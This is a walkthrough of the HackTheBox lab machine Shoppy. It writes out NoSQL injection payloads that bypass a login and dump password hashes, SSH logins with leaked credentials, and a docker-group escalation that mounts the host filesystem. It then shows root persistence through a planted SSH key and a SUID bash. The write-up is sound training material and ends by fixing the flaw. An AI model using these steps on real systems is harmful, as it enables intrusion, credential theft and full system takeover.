# HTB: Shoppy

[hackthebox](/tags#hackthebox ) [ctf](/tags#ctf ) [htb-shoppy](/tags#htb-
shoppy ) [nmap](/tags#nmap ) [feroxbuster](/tags#feroxbuster ) [nosql-
injection](/tags#nosql-injection ) [mattermost](/tags#mattermost ) [nosql-
auth-bypass](/tags#nosql-auth-bypass ) [burp](/tags#burp ) [burp-
repeater](/tags#burp-repeater ) [nodejs](/tags#nodejs )
[mongodb](/tags#mongodb ) [crackstation](/tags#crackstation ) [reverse-
engineering](/tags#reverse-engineering ) [sudo](/tags#sudo )
[ghidra](/tags#ghidra ) [docker](/tags#docker ) [docker-group](/tags#docker-
group ) [youtube](/tags#youtube ) [htb-mango](/tags#htb-mango ) [htb-
nodeblog](/tags#htb-nodeblog ) [htb-goodgames](/tags#htb-goodgames )  
  
Jan 14, 2023

HTB: Shoppy

![Shoppy](https://0xdfimages.gitlab.io/img/shoppy-cover.png)

Shoppy was one of the easier HackTheBox weekly machines to exploit, though
identifying the exploits for the initial foothold could be a bit tricky. I’ll
start by finding a website and use a NoSQL injection to bypass the admin login
page, and another to dump users and hashes. With a cracked hash, I’ll log into
a Mattermost server where I’ll find creds to the box that work for SSH. From
there, I’ll need the lighest of reverse enginnering to get a static password
from a binary, which gets me to the next user. This user is in the docker
group, so I’ll load an image mounting the host file system, and get full disk
access. I’ll show two ways to get a shell from that. In Beyond Root, a video
walkthrough of the vulnerable web-server code, showing how the injections
worked, and fixing them.

## Box Info

Name | [Shoppy](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fshoppy) [ ![Shoppy](../img/box-shoppy.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fshoppy)  
[Play on
HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fshoppy)  
---|---  
Release Date | [17 Sep 2022](https://twitter.com/hackthebox_eu/status/1570427233277444096)  
Retire Date | 14 Jan 2023  
OS | Linux ![Linux](../img/Linux.png)  
Base Points | Easy [20]  
Rated Difficulty | ![Rated difficulty for Shoppy](../img/shoppy-diff.png)  
Radar Graph | ![Radar chart for Shoppy](../img/shoppy-radar.png)  
![First Blood User](../img/first-blood-user.png) | 00:06:03[![22sh](https://www.hackthebox.com/badge/image/143207) 22sh](https://app.hackthebox.com/users/143207)  
  
![First Blood Root](../img/first-blood-root.png) | 00:12:37[![22sh](https://www.hackthebox.com/badge/image/143207) 22sh](https://app.hackthebox.com/users/143207)  
  
Creator | [![lockscan](https://www.hackthebox.com/badge/image/217870) lockscan](https://app.hackthebox.com/users/217870)  
  
  
## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

    
    
    oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.180
    Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-10 22:20 UTC
    Nmap scan report for 10.10.11.180
    Host is up (0.089s latency).
    Not shown: 65532 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    9093/tcp open  copycat
    
    Nmap done: 1 IP address (1 host up) scanned in 7.46 seconds
    
    oxdf@hacky$ nmap -p 22,80,9093 -sCV 10.10.11.180
    Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-10 21:41 UTC
    Nmap scan report for 10.10.11.180
    Host is up (0.088s latency).
    
    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
    80/tcp   open  http     nginx 1.23.1
    |_http-server-header: nginx/1.23.1
    |_http-title: Did not follow redirect to http://shoppy.htb
    9093/tcp open  copycat?
    | fingerprint-strings: 
    |   GenericLines: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest, HTTPOptions: 
    |     HTTP/1.0 200 OK
    |     Content-Type: text/plain; version=0.0.4; charset=utf-8
    |     Date: Tue, 10 Jan 2023 21:41:55 GMT
    |     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
    |     TYPE go_gc_cycles_automatic_gc_cycles_total counter
    |     go_gc_cycles_automatic_gc_cycles_total 4
    |     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
    |     TYPE go_gc_cycles_forced_gc_cycles_total counter
    |     go_gc_cycles_forced_gc_cycles_total 0
    |     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
    |     TYPE go_gc_cycles_total_gc_cycles_total counter
    |     go_gc_cycles_total_gc_cycles_total 4
    |     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
    |     TYPE go_gc_duration_seconds summary
    |     go_gc_duration_seconds{quantile="0"} 4.8561e-05
    |     go_gc_duration_seconds{quantile="0.25"} 8.7123e-05
    |_    go_gc_dur
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port9093-TCP:V=7.80%I=7%D=1/10%Time=63BDDBA3%P=x86_64-pc-linux-gnu%r(Ge
    SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
    ...[snip]...
    SF:8561e-05\ngo_gc_duration_seconds{quantile=\"0\.25\"}\x208\.7123e-05\ngo
    SF:_gc_dur");
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 104.98 seconds
    

Based on the [OpenSSH
version](https://packages.ubuntu.com/search?keywords=openssh-server), the host
is likely running Debian 11 bullseye. Port 80 shows a redirect to
`shoppy.htb`.

### Subdomain Fuzz

Given the use of DNS names, I’ll see if the server responds differently to any
subdomains with `wfuzz`. By first running with no filter, I can check the
default response:

    
    
    oxdf@hacky$ wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
    ********************************************************
    * Wfuzz 2.4.5 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://10.10.11.180/
    Total requests: 4989
    
    =================================================================== 
    ID           Response   Lines    Word     Chars       Payload
    =================================================================== 
    
    000000001:   301        7 L      11 W     169 Ch      "www"
    000000002:   301        7 L      11 W     169 Ch      "mail"
    000000003:   301        7 L      11 W     169 Ch      "ftp"
    000000004:   301        7 L      11 W     169 Ch      "localhost"
    000000005:   301        7 L      11 W     169 Ch      "webmail"
    000000006:   301        7 L      11 W     169 Ch      "smtp"
    000000007:   301        7 L      11 W     169 Ch      "webdisk"
    000000008:   301        7 L      11 W     169 Ch      "pop"
    000000009:   301        7 L      11 W     169 Ch      "cpanel"
    000000010:   301        7 L      11 W     169 Ch      "whm"
    ...[snip]...
    

Seems like 169 characters is the default, so I’ll filter that with `--hh 169`:

    
    
    oxdf@hacky$ wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 169
    ********************************************************
    * Wfuzz 2.4.5 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://10.10.11.180/
    Total requests: 100000
    
    ===================================================================
    ID           Response   Lines    Word     Chars       Payload
    ===================================================================
    
    000047340:   200        0 L      141 W    3122 Ch     "mattermost"
    
    Total time: 867.1220
    Processed Requests: 100000
    Filtered Requests: 99999
    Requests/sec.: 115.3240
    

I’ll add both `shoppy.htb` and `mattermost.shoppy.htb` to my `/etc/hosts`
file:

    
    
    10.10.11.180 shoppy.htb mattermost.shoppy.htb
    

### shoppy.htb - TCP 80

#### Site

The site just says that the store is coming soon:

[
![image-20230110194211994](https://0xdfimages.gitlab.io/img/image-20230110194211994.png)
](https://0xdfimages.gitlab.io/img/image-20230110194211994.png)

[_Click for full
image_](https://0xdfimages.gitlab.io/img/image-20230110194211994.png)

#### Tech Stack

I’ll guess at file names for the default path, with things like `/index.html`,
`index.php`, and find nothing. This doesn’t tell me what the technology stack
is, but it suggests it’s not PHP, and likely not just a static site, but
likely some framework that assigns routes.

The HTTP response headers don’t give any additional information.

#### Directory Brute Force

I’ll run `feroxbuster` against the site to look for paths on the site that
aren’t linked:

    
    
    oxdf@hacky$ feroxbuster -u http://shoppy.htb
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.7.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://shoppy.htb
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.7.1
     🏁  HTTP methods          │ [GET]
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Management Menu™
    ──────────────────────────────────────────────────
    301      GET       10l       16w      173c http://shoppy.htb/css => /css/
    302      GET        1l        4w       28c http://shoppy.htb/admin => /login
    301      GET       10l       16w      171c http://shoppy.htb/js => /js/
    301      GET       10l       16w      179c http://shoppy.htb/images => /images/
    200      GET       57l      129w     2178c http://shoppy.htb/
    200      GET       26l       62w     1074c http://shoppy.htb/login
    301      GET       10l       16w      179c http://shoppy.htb/assets => /assets/
    302      GET        1l        4w       28c http://shoppy.htb/Admin => /login
    200      GET       26l       62w     1074c http://shoppy.htb/Login
    301      GET       10l       16w      185c http://shoppy.htb/assets/js => /assets/js/
    301      GET       10l       16w      187c http://shoppy.htb/assets/css => /assets/css/
    301      GET       10l       16w      187c http://shoppy.htb/assets/img => /assets../img/
    301      GET       10l       16w      177c http://shoppy.htb/fonts => /fonts/
    301      GET       10l       16w      191c http://shoppy.htb/assets/fonts => /assets/fonts/
    302      GET        1l        4w       28c http://shoppy.htb/ADMIN => /login
    301      GET       10l       16w      203c http://shoppy.htb/assets../img/avatars => /assets/img/avatars/
    301      GET       10l       16w      181c http://shoppy.htb/exports => /exports/
    301      GET       10l       16w      197c http://shoppy.htb/assets../img/dogs => /assets/img/dogs/
    200      GET       26l       62w     1074c http://shoppy.htb/LOGIN
    [####################] - 9m    420000/420000  0s      found:19      errors:0      
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/css 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/js 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/images 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/ 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/assets 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/assets/js 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/assets/css 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/assets/img 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/fonts 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/assets/fonts 
    [####################] - 8m     30000/30000   57/s    http://shoppy.htb/assets../img/avatars 
    [####################] - 8m     30000/30000   56/s    http://shoppy.htb/exports 
    [####################] - 6m     30000/30000   78/s    http://shoppy.htb/assets../img/dogs 
    

`/admin` and `/login` are the most interesting (though the former just
redirects to the latter)

#### /login

`/login` gives a login form:

![image-20230111115916994](https://0xdfimages.gitlab.io/img/image-20230111115916994.png)

Testing a few guesses, there’s no obvious difference between non-existent user
and wrong password (though I don’t know for sure there is an admin user).
Everything I put in just return “Wrong Credentials”:

![image-20230111120034398](https://0xdfimages.gitlab.io/img/image-20230111120034398.png)

### mattermost.shoppy.htb - TCP 80

#### Site

This looks like an instance of
[Mattermost](https://github.com/mattermost/mattermost-server), an open source
Slack alternative. Visiting redirects to a login form at `/login`:

![image-20230111120420590](https://0xdfimages.gitlab.io/img/image-20230111120420590.png)

#### Tech Stack

The headers show that it is still NGINX, but not much else:

    
    
    HTTP/1.1 200 OK
    Server: nginx/1.23.1
    Date: Wed, 11 Jan 2023 17:03:01 GMT
    Content-Type: text/html; charset=utf-8
    Content-Length: 3122
    Connection: close
    Accept-Ranges: bytes
    Cache-Control: no-cache, max-age=31556926, public
    Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
    Last-Modified: Tue, 10 Jan 2023 21:37:24 GMT
    X-Frame-Options: SAMEORIGIN
    X-Request-Id: ykzwcf7fq3bktf1tr377jbja8h
    X-Version-Id: 7.1.2.7.1.2.c5e71b88555e841d57187938dfbf41ec.false
    

I’ll poke at the page source and the JavaScript files a bit for any clue about
the version it’s running, but without luck.

The copyright at the bottom of the page says 2023 (which is after the box was
released), so it must be updating dynamically.

#### Vulnerabilities

I’ll skip the directory brute force here, focusing on looking for potential
vulnerabilities. Neither Google nor `searchsploit` find anything of value. All
the CVEs are low impact. I’ll have to come back here once I find some
credentials and can login.

### HTTP - TCP 9093

Visiting this over HTTP returns some kind of log:

[![image-20230111122430910](https://0xdfimages.gitlab.io/img/image-20230111122430910.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20230111122430910.png)

Trying to figure out what this was sent me down a bit of a rabbit hole. Port
9093 is associated with the Prometheus AltertManager Plugin for Mattermost, so
that could be it.

It mentions `playbook_plugin_process` many times down in the file. That could
be a [Mattermost thing](https://github.com/mattermost/mattermost-plugin-
playbooks) as well.

No matter what it is, there isn’t much information here that seems too useful
to me.

## Shell as jaeger

### Admin Auth ByPass

#### Not SQL Injection

I always quickly jam a few SQL injection payloads into a form when I see one.
In this case, I’ll send the login request to Burp Repeater and try adding a
simple `'`. The request hangs for a full minute, then returns a 504 Gateway
Time-out:

![image-20230111170636986](https://0xdfimages.gitlab.io/img/image-20230111170636986.png)

This suggests the server is having a really hard time with that request, and
it could be nothing, or it could be something.

No other SQL injection payloads I try return anything different.

#### NoSQL Failures

Given that `'` is messing up the server, I’ll look at NoSQL as well. One way
to try this would be with something like I showed in [Mango](/2020/04/18/htb-
mango.html#nosql-inejction-login-bypass):

    
    
    username[$ne]=admin&password[$ne]=admin
    

That doesn’t work here, and hangs just the same.

Another way would be to convert to JSON. I’ll change the `Content-Type` header
as well as the payload itself. Without an injection, this works fine
(returning the 302 saying it failed login):

![image-20230111174837315](https://0xdfimages.gitlab.io/img/image-20230111174837315.png)

Now I can try the method that worked in [NodeBlog](/2022/01/10/htb-
nodeblog.html#auth-bypass-via-nosql-injection), but it hangs, and eventually
returns a timeout:

![image-20230113092744407](https://0xdfimages.gitlab.io/img/image-20230113092744407.png)

At one point I did accidentally send the `"$ne"` without the `"` around it,
which returned a 400:

![image-20230111175106255](https://0xdfimages.gitlab.io/img/image-20230111175106255.png)

Rending this response shows an error trace:

![image-20230111175234942](https://0xdfimages.gitlab.io/img/image-20230111175234942.png)

It doesn’t like the `$` character, and it’s at the JSON parsing level, before
it gets to a potential DB call. Seems like a deadend there. But I did leak
some interesting information:

  * Username on box jaeger
  * App is running out of `/home/jaeger/ShoppyApp`

Neither of these end up important to getting a foothold, but this is the kind
of information that could be useful in general.

#### NoSQL Injection Success

There’s a method of attacking NoSQL queries that looks much more like SQL
injection which I find in [this article](https://nullsweep.com/a-nosql-
injection-primer-with-mongo/) from Null Sweep. I wanted to try the tool
described in this post ([nosqli](https://github.com/Charlie-belmer/nosqli)),
but the hang when sending many payloads causes the tool to fail.

At the bottom of the article, they give this example:

    
    
    let username = req.query.username;
    query = { $where: `this.username == '${username}'` }
    User.find(query, function (err, users) {
    	if (err) {
    		// Handle errors
    	} else {
    		res.render('userlookup', { title: 'User Lookup', users: users });
    	}
    });
    

And they show how they can get all the users with `' || 'a'=='a`.

I like to try payloads like this in the `username` field, since hopefully the
password field is going to be hashes before it is used. Going back to this
payload (and seeing `Content-Type` back to `application/x-www-form-
urlencoded`):

    
    
    username=admin' || 'a'=='a&password=admin
    

Results in:

    
    
    HTTP/1.1 302 Found
    Server: nginx/1.23.1
    Date: Wed, 11 Jan 2023 23:00:49 GMT
    Content-Type: text/html; charset=utf-8
    Content-Length: 56
    Connection: close
    Location: /admin
    Vary: Accept
    Set-Cookie: connect.sid=s%3AReILweHHX4bMBcDk4TiDrE3ATGvqbBnT.1x8gE%2Fp%2FM79FzOS6DQvwdmngxdyyyvT637dxIsReuZQ; Path=/; HttpOnly
    
    <p>Found. Redirecting to <a href="/admin">/admin</a></p>
    

That’s a cookie set and a redirect to `/admin`! That’s success.

Interestingly, this only works if the username exists. If I change the payload
to:

    
    
    username=0xdf' || 'a'=='a&password=admin
    

It redirects with “Wrong Credentials”.

I’ll dig into this and another NoSQL vulnerability in Beyond Root.

### Access to Mattermost

#### Enumeration

Either by grabbing the cookie from Repeater or just logging in from Firefox
with the NoSQL payload, I get into the admin panel:

![image-20230111180655873](https://0xdfimages.gitlab.io/img/image-20230111180655873.png)

That page looks relatively static. The “Search for users” button leads to
`/admin/search-users`:

![image-20230111180733256](https://0xdfimages.gitlab.io/img/image-20230111180733256.png)

If I search for “0xdf”, it finds nothing. If I search for “admin”, it offers a
download:

![image-20230111181009832](https://0xdfimages.gitlab.io/img/image-20230111181009832.png)

It opens `export-search.json`, which contains admin’s id, username, and
password:

![image-20230111181054611](https://0xdfimages.gitlab.io/img/image-20230111181054611.png)

The hash looks like MD5, but doesn’t crack with `rockyou.txt`.

#### NoSQL Injection Again

The app has already shown itself vulnerable to NoSQL injection, so I’ll try
again:

![image-20230111204649798](https://0xdfimages.gitlab.io/img/image-20230111204649798.png)

This would get a record if the name is admin or if 1==1, which is always true!
It works, the resulting file has a second account it in:

![image-20230111204752869](https://0xdfimages.gitlab.io/img/image-20230111204752869.png)

#### Crack Hash

MD5 hashes (which are 32 hex characters in length like this one) are not
salted or anything, so the hash of the same input is always the same.
Wordlists like rockyou (which is what is typically used in HTB) have already
had all their hashes stored in rainbow tables which are accessible thought
things like [crackstation](https://crackstation.net/).

It comes back instantly:

[![image-20230111204954763](https://0xdfimages.gitlab.io/img/image-20230111204954763.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20230111204954763.png)

#### Log into Mattermost

This password with the username josh logs into Mattermost:

![image-20230111205142042](https://0xdfimages.gitlab.io/img/image-20230111205142042.png)

#### Creds for Jaeger

Reading the different channels, most is just small talk, but two channels have
interesting information.

The two interesting speakers in the chat are Josh and Jaeger. Josh’s profile
shows that they are a developer, and Jaeger is the CEO:

![image-20230111205619844](https://0xdfimages.gitlab.io/img/image-20230111205619844.png)

In the public channel “Development”, Josh talks about making a password
manager in C++. I’ll keep an eye out for this when I get a shell:

![image-20230112064608129](https://0xdfimages.gitlab.io/img/image-20230112064608129.png)

The “Deploy Machine” private channel has another conversation between Josh and
Jaeger. Jaeger asks for a machine set up with a username and password:

![image-20230111205719085](https://0xdfimages.gitlab.io/img/image-20230111205719085.png)

### SSH

With those creds, I can SSH into the box as jaeger:

    
    
    oxdf@hacky$ sshpass -p 'Sh0ppyBest@pp!' ssh jaeger@shoppy.htb
    Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    jaeger@shoppy:~$
    

And read `user.txt`:

    
    
    jaeger@shoppy:~$ cat user.txt
    91e995e9************************
    

## Shell as deploy

### Enumeration

jaeger can run `/home/deploy/password-manager` as deploy:

    
    
    jaeger@shoppy:~$ sudo -l
    [sudo] password for jaeger: 
    Matching Defaults entries for jaeger on shoppy:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User jaeger may run the following commands on shoppy:
        (deploy) /home/deploy/password-manager
    

`/home/deploy` has the binary, as well as the source and a `creds.txt`:

    
    
    jaeger@shoppy:~$ ls -l ../deploy/
    total 28
    -rw------- 1 deploy deploy    56 Jul 22 13:15 creds.txt
    -rwxr--r-- 1 deploy deploy 18440 Jul 22 13:20 password-manager
    -rw------- 1 deploy deploy   739 Feb  1  2022 password-manager.cpp
    

As jaeger, I can only read the binary. With `sudo`, I can also run it as
deploy:

    
    
    jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
    Welcome to Josh password manager!
    Please enter your master password: 0xdf
    Access denied! This incident will be reported !
    

I’ll copy it back to my machine with `scp`:

    
    
    oxdf@hacky$ sshpass -p 'Sh0ppyBest@pp!' scp jaeger@shoppy.htb:/home/deploy/password-manager .
    

### Reverse Engineering

#### Ghidra

The binary is a 64-bit ELF:

    
    
    oxdf@hacky$ file password-manager 
    password-manager: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped
    

I’ll open it in Ghidra to take a look. C++ is a mess in Ghidra, but the
program is very simple.

It prints the welcome and and password prompt:

![image-20230112071724418](https://0xdfimages.gitlab.io/img/image-20230112071724418.png)

Next it creates a string and saves my input into it:

![image-20230112071747211](https://0xdfimages.gitlab.io/img/image-20230112071747211.png)

Now it creates another string and appends the characters “S”, “a”, “m”, “p”,
“l”, “e” to it:

![image-20230112071911570](https://0xdfimages.gitlab.io/img/image-20230112071911570.png)

It compares the input to “Sample”, and if they don’t match (non-zero return in
`pass_match`), print the “Access denied!” message:

![image-20230112072051191](https://0xdfimages.gitlab.io/img/image-20230112072051191.png)

Otherwise, it prints “Access granted”, and then calls `system("cat
/home/deploy/creds.txt")`:

![image-20230112072132236](https://0xdfimages.gitlab.io/img/image-20230112072132236.png)

#### strings

Originally I did try running strings on the binary, but didn’t see anything
that looked like a password. Only after solving when chatting with IppSec did
he point out that I should also check 16-bit character strings, and there it
is (the only 16-bit character string):

    
    
    oxdf@hacky$ strings -el password-manager 
    Sample
    

### su

With that information, I’ll run the binary again on Shoppy and it prints creds
for deploy:

    
    
    jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
    Welcome to Josh password manager!
    Please enter your master password: Sample
    Access granted! Here is creds !
    Deploy Creds :
    username: deploy
    password: Deploying@pp!
    

`su` allows me to switch users with their password:

    
    
    jaeger@shoppy:~$ su deploy
    Password: 
    $ bash
    deploy@shoppy:/home/jaeger$
    

deploy seems to have `sh` as their default shell, but I’ll switch to `bash`. I
can see this in the `/etc/passwd` file:

    
    
    deploy@shoppy:/home/jaeger$ cat /etc/passwd | grep deploy
    deploy:x:1001:1001::/home/deploy:/bin/sh
    

## Shell as root

### Enumeration

There aren’t any other interesting files in `/home/deploy`, and nothing else
on the file system jumps out.

deploy is in one additional group:

    
    
    deploy@shoppy:~$ id
    uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
    

`docker` is installed on the box, and because deploy it in the `docker` group,
they can interact with it, though no containers are running:

    
    
    deploy@shoppy:~$ docker ps
    CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
    

There is one image on the box, [apline](https://hub.docker.com/_/alpine), a
very small image with limited functionality:

    
    
    deploy@shoppy:~$ docker images
    REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
    alpine       latest    d7d3d98c851f   5 months ago   5.53MB
    

### Access Filesystem as root

#### Basic

The exploit here is to create a new container that has the entire file system
mounted into it. In that container, I’ll be root, and thus have full access to
all the files in the container (including the full host filesystem).

I’ve shown this several times with `lxc` before, but never like this with
Docker ([GoodGames](/2022/02/23/htb-goodgames.html#shell-1) is the closest
example).

I’ll start the container with `docker run` and the following options:

  * `--rm` \- remove the container when it’s done
  * `-it` \- keep STDIN open and assign a PTTY
  * `-v /:/mnt` \- mount the host `/` to `/mnt` inside the container

I’ll also give it the image name (alpine) and the command to run `/bin/sh` (no
`bash` on Alpine). With these, I can start the image and find the host file
system in `/mnt`:

    
    
    deploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine /bin/sh
    / # ls
    bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
    / # ls /mnt/
    bin             dev             home            initrd.img.old  lib32           libx32          media           opt             root            sbin            sys             usr             vmlinuz
    boot            etc             initrd.img      lib             lib64           lost+found      mnt             proc            run             srv             tmp             var             vmlinuz.old
    

#### Neat Upgrade

A neat trick from the [Docker GTFObins
page](https://gtfobins.github.io/gtfobins/docker/) is to use `chroot` instead
of `sh` as the command. I don’t really need anything in the container
filesystem. So I’ll call `chroot /mnt /bin/sh` (giving it a command to run as
well, see the [man page](https://linux.die.net/man/1/chroot)). This will set
the root of the filesystem to be what was `/mnt`, and then run a shell. This
gives the feel as if I’m just back on the host:

    
    
    deploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine chroot /mnt sh
    # ls
    bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
    

#### Read Flag

From here I can read `root.txt`:

    
    
    # cat /root/root.txt
    5c6e2d67************************
    

### Shell

#### SSH

The simplest way to get a shell as root is to drop my public SSH key into an
`authorized_keys` file for root:

    
    
    # mkdir /root/.ssh
    # echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > /root/.ssh/authorized_keys 
    # chmod 600 /root/.ssh/authorized_keys
    

Now I can connect with SSH:

    
    
    oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@shoppy.htb
    Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    root@shoppy:~#
    

#### SUID bash

A perhaps quieter way is to make `bash` SetUID:

    
    
    # chmod 4777 /bin/bash
    

Because I’m working from the `chroot` file system, that `bash` is on the host.
Exiting the container, I can verify it worked because the first `x` is now
`s`:

    
    
    deploy@shoppy:~$ ls -l /bin/bash
    -rwsrwxrwx 1 root root 1234376 Mar 27  2022 /bin/bash
    

Running it (with `-p` to not drop privs) gives a shell with the effective id
of root:

    
    
    deploy@shoppy:~$ bash -p
    bash-5.1# id
    uid=1001(deploy) gid=1001(deploy) euid=0(root) groups=1001(deploy),998(docker)
    

## Beyond Root - NoSQL Injection

In [this video](https://www.youtube.com/watch?v=EfLW51f6KFo), I’ll use VSCode
to connect to Shoppy, and analyze the NodeJS code for the website to better
understand the NoSQL injections. Then I’ll fix the vulnerabilities and show
that they no longer are exploitable:

One thing I didn’t go into in the video was how the boolean logic works for
this injection. With the injection `admin'||'a'=='a`, the query becomes:

    
    
    this.username == 'admin' || 'a'=='a' && this.password == '0xdf'
    

That is:

    
    
    true || true && false
    

How does that evaluate? I can check it in a browser:

![image-20230113094927242](https://0xdfimages.gitlab.io/img/image-20230113094927242.png)

But why does it work? The [Operator
Precedence](https://developer.mozilla.org/en-
US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence#table) for
JavaScript groups operators into groups numbered 1-18, which are processed
from 18 down to 1. Logical AND (`&&`) is group 4, and Logical OR (`||`) is in
group 3:

![image-20230113095139932](https://0xdfimages.gitlab.io/img/image-20230113095139932.png)

So for the user admin, the query can be simplified a bit on each line:

    
    
    this.username == 'admin' || 'a'=='a' && this.password == '0xdf'
    true || true && false
    true || false
    true
    

[](/2023/01/14/htb-shoppy.html)

